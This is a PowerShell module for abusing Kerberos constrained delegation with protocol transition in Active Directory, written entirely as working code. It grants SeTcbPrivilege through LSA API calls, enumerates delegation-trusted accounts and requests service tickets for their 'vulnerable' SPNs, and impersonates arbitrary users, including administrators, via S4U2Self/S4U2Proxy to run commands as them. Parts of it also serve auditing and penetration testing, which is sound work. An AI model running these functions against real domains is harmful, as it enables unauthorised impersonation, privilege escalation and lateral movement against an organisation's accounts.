<#
    Author: Matan Hart (@machosec)
    License: MIT License
    Required Dependencies: None
    Optional Dependencies: None
#>

function Add-SeTcbPrivilege
{
    <#
        .SYNOPSIS
            Adds the "act as part of the operating system" (SeTcbPrivilege) privilege to a user
            
        .DESCRIPTION 
            Adds the "act as part of the operating system" (SeTcbPrivilege) privilege to a user.
            This priviege is is required by the S4U2Self extention to enable protocol trantioning.
            By default, Local Administraotrs don't have this privileges, only SYSTEM (the computer account).
            This function requires local administravie rights.

        .PARAMETER UserName
            User name to grant the TCB (Trusted Computing Base) privilege. Defaults to current user  

        .EXAMPLE 
            Add-SeTcbPrivilege 
            Grant TCB privilege to the current user 

        .EXAMPLE
            Add-SeTcbPrivilege -UserName "company\bob"
            Grant TCB privilege to company\bob
    #>

    [CmdletBinding()]
    param 
    (
        [parameter(Position=0, ValueFromPipeline=$True)]
        [string]$UserName
    )

    $Signature = @'
    using System;
    using System.Collections.Generic;
    using System.Text;
 
    namespace LSA
    {
    using System.Runtime.InteropServices;
    using System.Security;
    using System.Management;
    using System.Runtime.CompilerServices;
    using System.ComponentModel;
 
    using LSA_HANDLE = IntPtr;
 
    [StructLayout(LayoutKind.Sequential)]
    struct LSA_OBJECT_ATTRIBUTES
    {
    internal int Length;
    internal IntPtr RootDirectory;
    internal IntPtr ObjectName;
    internal int Attributes;
    internal IntPtr SecurityDescriptor;
    internal IntPtr SecurityQualityOfService;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct LSA_UNICODE_STRING
    {
    internal ushort Length;
    internal ushort MaximumLength;
    [MarshalAs(UnmanagedType.LPWStr)]
    internal string Buffer;
    }
    sealed class Win32Sec
    {
    [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true),
    SuppressUnmanagedCodeSecurityAttribute]
    internal static extern uint LsaOpenPolicy(
    LSA_UNICODE_STRING[] SystemName,
    ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
    int AccessMask,
    out IntPtr PolicyHandle
    );
 
    [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true),
    SuppressUnmanagedCodeSecurityAttribute]
    internal static extern uint LsaAddAccountRights(
    LSA_HANDLE PolicyHandle,
    IntPtr pSID,
    LSA_UNICODE_STRING[] UserRights,
    int CountOfRights
    );
 
    [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true),
    SuppressUnmanagedCodeSecurityAttribute]
    internal static extern int LsaLookupNames2(
    LSA_HANDLE PolicyHandle,
    uint Flags,
    uint Count,
    LSA_UNICODE_STRING[] Names,
    ref IntPtr ReferencedDomains,
    ref IntPtr Sids
    );
 
    [DllImport("advapi32")]
    internal static extern int LsaNtStatusToWinError(int NTSTATUS);
 
    [DllImport("advapi32")]
    internal static extern int LsaClose(IntPtr PolicyHandle);
 
    [DllImport("advapi32")]
    internal static extern int LsaFreeMemory(IntPtr Buffer);
 
    }

    public sealed class LsaWrapper : IDisposable
    {
    [StructLayout(LayoutKind.Sequential)]
    struct LSA_TRUST_INFORMATION
    {
    internal LSA_UNICODE_STRING Name;
    internal IntPtr Sid;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct LSA_TRANSLATED_SID2
    {
    internal SidNameUse Use;
    internal IntPtr Sid;
    internal int DomainIndex;
    uint Flags;
    }
 
    [StructLayout(LayoutKind.Sequential)]
    struct LSA_REFERENCED_DOMAIN_LIST
    {
    internal uint Entries;
    internal LSA_TRUST_INFORMATION Domains;
    }
 
    enum SidNameUse : int
    {
    User = 1,
    Group = 2,
    Domain = 3,
    Alias = 4,
    KnownGroup = 5,
    DeletedAccount = 6,
    Invalid = 7,
    Unknown = 8,
    Computer = 9
    }
 
    enum Access : int
    {
    POLICY_READ = 0x20006,
    POLICY_ALL_ACCESS = 0x00F0FFF,
    POLICY_EXECUTE = 0X20801,
    POLICY_WRITE = 0X207F8
    }
    const uint STATUS_ACCESS_DENIED = 0xc0000022;
    const uint STATUS_INSUFFICIENT_RESOURCES = 0xc000009a;
    const uint STATUS_NO_MEMORY = 0xc0000017;
 
    IntPtr lsaHandle;
 
    public LsaWrapper()
    : this(null)
    { }
    // // local system if systemName is null
    public LsaWrapper(string systemName)
    {
    LSA_OBJECT_ATTRIBUTES lsaAttr;
    lsaAttr.RootDirectory = IntPtr.Zero;
    lsaAttr.ObjectName = IntPtr.Zero;
    lsaAttr.Attributes = 0;
    lsaAttr.SecurityDescriptor = IntPtr.Zero;
    lsaAttr.SecurityQualityOfService = IntPtr.Zero;
    lsaAttr.Length = Marshal.SizeOf(typeof(LSA_OBJECT_ATTRIBUTES));
    lsaHandle = IntPtr.Zero;
    LSA_UNICODE_STRING[] system = null;
    if (systemName != null)
    {
    system = new LSA_UNICODE_STRING[1];
    system[0] = InitLsaString(systemName);
    }
 
    uint ret = Win32Sec.LsaOpenPolicy(system, ref lsaAttr,
    (int)Access.POLICY_ALL_ACCESS, out lsaHandle);
    if (ret == 0)
    return;
    if (ret == STATUS_ACCESS_DENIED)
    {
    throw new UnauthorizedAccessException();
    }
    if ((ret == STATUS_INSUFFICIENT_RESOURCES) || (ret == STATUS_NO_MEMORY))
    {
    throw new OutOfMemoryException();
    }
    throw new Win32Exception(Win32Sec.LsaNtStatusToWinError((int)ret));
    }
 
    public void Add(string account)
    {
    IntPtr pSid = GetSIDInformation(account);
    LSA_UNICODE_STRING[] privileges = new LSA_UNICODE_STRING[1];
    string privilege = "SeTcbPrivilege";
    privileges[0] = InitLsaString(privilege);
    uint ret = Win32Sec.LsaAddAccountRights(lsaHandle, pSid, privileges, 1);
    if (ret == 0)
    return;
    if (ret == STATUS_ACCESS_DENIED)
    {
    throw new UnauthorizedAccessException();
    }
    if ((ret == STATUS_INSUFFICIENT_RESOURCES) || (ret == STATUS_NO_MEMORY))
    {
    throw new OutOfMemoryException();
    }
    throw new Win32Exception(Win32Sec.LsaNtStatusToWinError((int)ret));
    }
 
    public void Dispose()
    {
    if (lsaHandle != IntPtr.Zero)
    {
    Win32Sec.LsaClose(lsaHandle);
    lsaHandle = IntPtr.Zero;
    }
    GC.SuppressFinalize(this);
    }
    ~LsaWrapper()
    {
    Dispose();
    }
    // helper functions
 
    IntPtr GetSIDInformation(string account)
    {
    LSA_UNICODE_STRING[] names = new LSA_UNICODE_STRING[1];
    LSA_TRANSLATED_SID2 lts;
    IntPtr tsids = IntPtr.Zero;
    IntPtr tdom = IntPtr.Zero;
    names[0] = InitLsaString(account);
    lts.Sid = IntPtr.Zero;
    // Console.WriteLine("String account: {0}", names[0].Length);
    int ret = Win32Sec.LsaLookupNames2(lsaHandle, 0, 1, names, ref tdom, ref tsids);
    if (ret != 0)
    throw new Win32Exception(Win32Sec.LsaNtStatusToWinError(ret));
    lts = (LSA_TRANSLATED_SID2)Marshal.PtrToStructure(tsids,
    typeof(LSA_TRANSLATED_SID2));
    Win32Sec.LsaFreeMemory(tsids);
    Win32Sec.LsaFreeMemory(tdom);
    return lts.Sid;
    }
 
    static LSA_UNICODE_STRING InitLsaString(string s)
    {
    // Unicode strings max. 32KB
    if (s.Length > 0x7ffe)
    throw new ArgumentException("String too long");
    LSA_UNICODE_STRING lus = new LSA_UNICODE_STRING();
    lus.Buffer = s;
    lus.Length = (ushort)(s.Length * sizeof(char));
    lus.MaximumLength = (ushort)(lus.Length + sizeof(char));
    return lus;
    }
    }
    public class TcbPrivilege
    {
    public static void Add(string account)
    {
    using (LsaWrapper lsaWrapper = new LsaWrapper())
    {
    lsaWrapper.Add(account);
    }
    }
    }
    }
'@
    if ($UserName)
    {
        if ($UserName -like "*@*")
        {
            $UserName = $UserName -split "@"
            $UserName = "$($UserName[1])\$($UserName[0])"
        }
        elseif ($UserName -notlike "*\*")
        {
            $UserName = "$env:USERDOMAIN\$UserName"
        }
    }
    else
    {
        $UserName = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    }
    Write-Verbose "Trying to add SeTcbPrivileges to ""$UserName"""
    if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        Add-Type $Signature -PassThru | Out-Null
        try 
        {
            [LSA.TcbPrivilege]::Add($UserName)
            Write-Output "$UserName is now allowed to act as part of the operation system"
        }
        catch 
        {
            Write-Error $_.Exception.Message
        }
    }
    else 
    {
        Write-Error "You have to be eleavted (Administrator) to add Tcb privileges"
    }
}

function Find-DelegationAccounts
{
    <#
        .SYNOPSIS
            Find accounts that are trusted for Kerberos delegation
            
         .DESCRIPTION 
            Queries the Active Directory for accounts that are trusted for delegation (Unconstrained, Contrained and Protocol Transition).
            The output is the a
            The query filters Domain Controllers and disabled accounts.

        .PARAMETER Domain
            Domain name to query. Defaults to current forest

        .PARAMETER Type
            Delegation type to filter. Options are Unconstraind Delegation, Constrained Delegation and Protocol Transition

        .PARAMETER GetTicket
            Obtain a service ticket for all SPNs that are vulnerable for imperosnation (constrained delegation)

        .EXAMPLE 
            Find-AccountsTrustedForDelegation
            Retreives information about accounts that are trusted for delegation in the current forest

        .EXAMPLE
            Find-AccountsTrustedForDelegation -Domain CompanyA -Type "Protocol Transition" -GetTicket
            Retreives information about accounts that are trusted for constrained delegation with protocol transition in "CompanyA" domain and accuire an SPN for the vulnerable services.
    #>
    [CmdletBinding()]
    param
    (
        [string]$Domain,
        [ValidateSet("Unconstrained Delegation","Constrained Delegation", "Protocol Transition")]
        [string]$Type,
        [switch]$GetTicket
    )
    if ($Domain)
    {
        $TargetDomain = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
        try 
        {
            $Scope = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($TargetDomain).Name
        }
        catch 
        {
            Write-Error "Error getting domain ""$Domain"" object: $($_.Exception.Message)" -ErrorAction Stop
        }
    }
    else 
    {
        try 
        {
            $Scope = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Domains.Name
        }
        catch 
        {
            Write-Error "Error getting current forest object: $($_.Exception.Message)" -ErrorAction Stop
        }
    }
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
    $Properties = "msDS-AllowedToDelegateTo", "samaccounttype", "useraccountcontrol", "samaccountname", "serviceprincipalname", "description"
    foreach ($Property in $Properties)
    {
        $Searcher.PropertiesToLoad.Add($Property) | Out-Null
    }
    #filter all enabled accounts that are trusted for unconstrained or constrained delegation without DCs
    $Searcher.Filter = "(&(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*))(!((userAccountControl:1.2.840.113556.1.4.803:=8192))))"
    $DelegationData = @()
    Write-Verbose "Querying $($Scope.Count) domains"
    foreach ($Domain in $Scope)
    {
        $Searcher.SearchRoot = 'LDAP://DC=' + ($Domain -Replace ("\.",',DC='))
        Write-Verbose "Querying $Domain"
        try 
        {
            $Accounts = $Searcher.FindAll().Properties
            if ($Accounts)
            {
                foreach ($Account in $Accounts)
                {
                    $Account.Add("domain", ($Domain -split "\.")[0].ToUpper())
                    $DelegationData += $Account
                }
            }
        }
        catch 
        {
            Write-Warning "couldn't query domain ""$Domain"" - $($_.Exception.Message)" 
        }
    }
    if ($DelegationData)
    {
        Write-Verbose "Found $($DelegationData.Count) accounts that are trusted for delegation"
        $DelegationAccounts = @()
        foreach ($Account in $DelegationData)
        {
            [int32]$UAC = [string]$Account.useraccountcontrol
            #if the account is trusted for Kerberos unconstrained delegation
            if ($UAC -band 0x800000)
            {
                $DelegationType = "Unconstrained Delegation"
                $AllowedServices = "Any service (SPN)"
                $VulnerableServices = "Any service (SPN)"
            }
            #The account is trusted for Kerberos constrained delegation
            else
            {
                $DelegationType = "Constrained Delegation"
                #if the account is trusted for protocol transition
                if ($UAC -band 0x1000000) 
                {
                    $DelegationType = "Protocol Transition"
                }
                $AllowedServices = [array]$Account.'msds-allowedtodelegateto'
                $VulnerableServices = @()
                foreach ($SPN in $AllowedServices)
                {
                    $Searcher.Filter = "(serviceprincipalname=$SPN)"
                    $VulnerableServices += $Searcher.FindAll().Properties.serviceprincipalname
                }
                #requesting TGS (service ticket) for the target SPN
                if ($GetTicket)
                {
                    Add-Type -AssemblyName System.IdentityModel
                    foreach ($SPN in $VulnerableServices)
                    {
                        try
                        {
                            Write-Verbose "Asking for TGS for the SPN: $SPN"
                            #requesting TGS (service ticket) for the target SPN
                            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
                        }
                        catch
                        {
                            Write-Warning "Could not request a TGS for the SPN: $SPN - Is it exists?"
                        }
                    }
                }
            }
            $AccountType = "Computer"
            if ($Account.samaccounttype -eq "805306368")
            {
                $AccountType = "User"
            }
            $AccountData = New-Object -TypeName psobject -Property @{
            AccountName          = "$($Account.domain)\$([string]$Account.samaccountname)"
            TrustedFor           = $DelegationType
            AccountType          = $AccountType
            Description          = [string]$Account.description
            AllowedServices      = $AllowedServices
            VulnerableServices   = $VulnerableServices | Sort-Object -Unique
            AccountSPNs          = $Account.serviceprincipalname
            } | select AccountName,TrustedFor,AccountType,Description,AllowedServices,VulnerableServices,AccountSPNs 
            $DelegationAccounts += $AccountData 
        }
    }
    else 
    {
        Write-Warning "Couldn't find any accounts that are trusted for delegation"
    }
    if ($Type)
    {
        return $DelegationAccounts | ? {$_.DelegationType -eq $Type}
    }
    return $DelegationAccounts
}

function Get-CurrentIdentity
{
    <#
        .SYNOPSIS
            Retreives information about the current identity

        .DESCRIPTION
            Retreives information about the current identity.
            The output includes the username, SID, imperosnation level, token and domain group membership

        .EXAMPLE 
            Get-CurrentIdentity
            Retreives information about the current identity
    #>

    [CmdletBinding()] 
    param ()
    $Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $DomainGroups = @()
    foreach ($Group in $Identity.Groups)
    {
        try
        {
            if ($Group.AccountDomainSid)
            {
                $DomainGroups += $Group.Translate([System.Security.Principal.NTAccount]).Value
            }
        }
        catch
        {
            Write-Warning "SID: ""$($Group.Value)"" couldn't be translated to group name"
        }
    }
    $IdentityData = New-Object -TypeName psobject -Property @{
    UserName           = $Identity.Name
    UserSID            = $Identity.User.Value
    ImpersonationLevel = $Identity.ImpersonationLevel
    Token              = $Identity.Token
    GroupMembership    = $DomainGroups | Sort-Object -Unique
    } | select UserName,UserSID,ImpersonationLevel,Token,GroupMembership
    return $IdentityData
}

function New-Impersonation
{
    <#
    .SYNOPSIS
        Impersonates an arbitrary identity using the S4U2Self and S4U2Proxy Kerberos extensions (Protocol Transition)
          
    .DESCRIPTION
        Impersonates an arbitrary identity using the S4U2Self and S4U2Proxy Kerberos extensions.
        The Impersonation is possible by supplying UPN (user@domain.com) if the account running this module
        has the SeTcbPrivilege on the machine and he is trusted for constrained delegatino with protocol transition.

    .PARAMETER UserName
        Mandatory. The domain name of the account desired for impersonation 
    
    .PARAMETER ScriptBlock
        The command to execute on behalf of the impersonated account

    .EXAMPLE 
            New-Impersonation Bob@comapnyA.com
            Imperosnate the user bob. All operations in this session will be in the secuirty context of bob

    .EXAMPLE
        New-Impersonation -UPN Bob@comapnyA.com -ScriptBlock {[Security.Principal.WindowsIdentity]::GetCurrent()}
         Imperosnate the user bob. Execute a single command in the secuirty context of bob
    #>
    [CmdletBinding()] 
    param
    (
        [parameter(Mandatory=$True, Position=0, ValueFromPipeline=$True)]
        [Alias("UserName")]
        [string]$UPN,
        [parameter(Mandatory=$false, Position=1)]
        [Alias("Command")]
        [scriptblock]$ScriptBlock
    )

    if ($UPN -like "*\*")
    {
        $UPN = $UPN -split "\\"
        $UPN = "$($UPN[1])@$($UPN[0])"
    }
    elseif ($UPN -notlike "*@*")
    {
        $Domain = $env:USERDNSDOMAIN.ToLower()
        $UPN = "$UPN@$Domain"
    }
    try
    {
        Add-Type -AssemblyName System.Security.Principal
        #creating impersonation token for UPN
        $Identity = New-Object System.Security.Principal.WindowsIdentity -ArgumentList $UPN
        Write-Verbose "Impersonation token ($($Identity.Token)) created"
    }
    catch
    {
         Write-Error "Creation of imperonsation token for $UPN failed - $($_.Exception.Message)" -ErrorAction Stop   
    }
    if ($Identity.ImpersonationLevel.value__ -eq 3)
    {
        Write-Verbose "Trying to impersonate $($Identity.Name)"
        try
        {
            $ImperosnationContext = $Identity.Impersonate()
            if ($ScriptBlock)
            {
                Write-Verbose "Invoking scriptblock on behalf of $($Identity.Name)"
                try
                {
                    Invoke-Command -ScriptBlock $ScriptBlock
                    Write-Output "Successfuly executed scriptblock on behalf of $($Identity.Name)"
                }
                catch 
                {
                    Write-Error "ScriptBlock Execution failed - $($_.Exception.Message)" 
                }
                finally
                {
                    $ImperosnationContext.Undo()
                }
            }
            else
            {
                Write-Output "Session now impersonating $($Identity.Name) ($($Identity.Token))"
            }
        }
        catch
        {
            $ImperosnationContext.Undo()
            Write-Error "Impersonation failed - $($_.Exception.Message)"
        }
    }
    else
    {
        Write-Error "Couldn't obtain impersonation privileges`nDoes $($Identity.Name) allowed to act as part of the operation system (SeTcbPrivlege enabled)?"
    }

}

function Read-DelegatedFlag
{
    <#
    .SYNOPSIS
        Reads the NOT_DELEGATED UAC flag of a user or users in the Active Directory
          
    .DESCRIPTION
        Reads the NOT_DELEGATED UAC flag of a user or users in the Active Directory.
        The query can be filtered by specifing SAM account name (support asterisks) or specifing a groupmemership.
        Custom LDAP filter is also supported.

    .PARAMETER UserName
        Filter accounts by SAM account name (support asterisks)
    
    .PARAMETER UserGroup
        Filter accounts by groupmembership name (support asterisks)

    .PARAMETER LDAPFilter
        Filter accounts by a custom LDAP filter

    .PARAMETER OnlyDelegated
        Show only accounts that allowed to be delegated

    .EXAMPLE 
            Read-DelegatedFlag CompanyA\Administrator
            Reads the NOT_DELEGATED UAC flag of the built-in administrator account

    .EXAMPLE
        Read-DelegatedFlag -UserGroup 'Domain Admins" -OnlyDelegated
         Reads the NOT_DELEGATED UAC flag of all the users in the Domain Admins group. Show only accounts that allowed to be delegated	
    #>
    [CmdletBinding(DefaultParametersetName="ByUserName")] 
    param
    (
        [string]$Domain = $env:USERDNSDOMAIN,
        [Parameter(Mandatory = $true, Position=0, ValueFromPipeline=$True, ParameterSetName = "ByUserName")]
        [ValidateNotNullOrEmpty()]
        [string]$UserName,
        [Parameter(Mandatory = $true, ParameterSetName = "ByGroupName")]
        [ValidateNotNullOrEmpty()]
        [string]$UserGroup,
        [Parameter(Mandatory = $true, ParameterSetName = "Custom")]
        [ValidateNotNullOrEmpty()]
        [string]$LDAPFilter,
        [switch]$OnlyDelegated
    )

    $DomainObj = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
    try 
    {
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainObj).Name
    }
    catch 
    {
        Write-Error "Error getting domain object: $($_.Exception.Message)"
        break
    }
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
    $Searcher.SearchRoot = 'LDAP://DC=' + ($Domain -Replace ("\.",',DC='))
    $Searcher.PageSize = 250
    $Properties = "distinguishedname","userprincipalname","useraccountcontrol","description","lastlogon"
    foreach ($Property in $Properties)
    {
        $Searcher.PropertiesToLoad.Add($Property) | Out-Null
    }
    $Searcher.SearchRoot = 'LDAP://DC=' + ($Domain -Replace ("\.",',DC='))
    Write-Verbose "Querying $Domain"
    if ($PsCmdlet.ParameterSetName -eq "ByUserName")
    {
        if ($UserName -like "*@*")
        {
            $UserName = ($UserName -split "@")[0]
        }
        elseif ($UserName -like "*\*")
        {
            $UserName = ($UserName -split "\\")[1]
        }

        #filter user accounts by username
        $Searcher.Filter = "(&(samaccounttype=805306368)(samaccountname=$UserName))"
        $Users = $Searcher.FindAll().Properties
    }
    elseif ($PsCmdlet.ParameterSetName -eq "ByGroupName")
    {
        $Searcher.Filter = "(&(objectCategory=group)(cn=$UserGroup))" 
        $GroupDN = $Searcher.FindOne().Properties.distinguishedname
        if ($GroupDN)
        {
            Write-Verbose "$UserGroup resolved to $GroupDN"
            #filter user accounts by group membership
            $Searcher.Filter = "(&(samaccounttype=805306368)(memberOf=$GroupDN))"
            $Users = $Searcher.FindAll().Properties
        }
        else
        {
            Write-Warning "Couldn't find group ""$UserGroup"" - Is it exist?"
            break
        }
    }
    elseif ($PsCmdlet.ParameterSetName -eq "Custom")
    {
        $Searcher.Filter = $LDAPFilter
        try 
        {
            $Users = $Searcher.FindAll().Properties
        }
        catch 
        {
            Write-Error "The LDAP search filter search filter is invalid - Please check the syntax"
        } 
    }    
    if ($Users.useraccountcontrol)
    {
        if ($Users.Count -eq 250)
        {
            Write-Warning "Query has been limited to 250 users"
        }
        Write-Verbose "Found $($Users.Count) users"
        $Data = @()
        foreach ($User in $Users)
        {
            [int32]$UserUAC = [string]$User.useraccountcontrol
            $IsDelegated = $true
            #if the user's NOT_DELEGATED flag is set
            if ($UserUAC -band 0x100000) {$IsDelegated = $false}
            $UserData = New-Object -TypeName psobject -Property @{
            UserPrincipalName = [string]$User.userprincipalname
            IsDelegated       = $IsDelegated
            Description       = [string]$User.description
            LastLogon         = [datetime]::FromFileTime([string]$User.lastlogon)
            } | select UserPrincipalName,IsDelegated,Description,LastLogon
            $Data += $UserData 
        }
        if ($OnlyDelegated)
        {
            return $Data | ? {($_.IsDelegated)}
        }
        return $Data
    }
    else
    {
        if ($PsCmdlet.ParameterSetName -eq "ByUserName")
        {
            Write-Warning "Couldn't find user ""$UserName"" - maybe a typo?"
        }
        else 
        {
            Write-Warning "Couldn't find users in group ""$GroupDN"""
        } 
    }
}

function Undo-Impersonation
{
    <#
    .SYNOPSIS
        Reverts an impersonated session to the original account
          
    .DESCRIPTION
        Reverts an impersonated session to the original account

    .EXAMPLE
        Undo-Impersonation
         Reverts an impersonated session to the original account	
    #>
    [CmdletBinding()]
    param ()
    $Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    if ($Identity.ImpersonationLevel.value__ -ne 0)
    {
        [Security.Principal.WindowsIdentity]::Impersonate([IntPtr]::Zero) | Out-Null
        $Self = [Security.Principal.WindowsIdentity]::GetCurrent()
        Write-Output "Successfully reverted back from $($Identity.Name) to $($Self.Name)"
        Write-Verbose "Token: $($Self.Token)"
    }
    else
    {
        Write-Warning "Token $($Identity.Token) ($($Identity.Name)) is not impersonated"
    }
}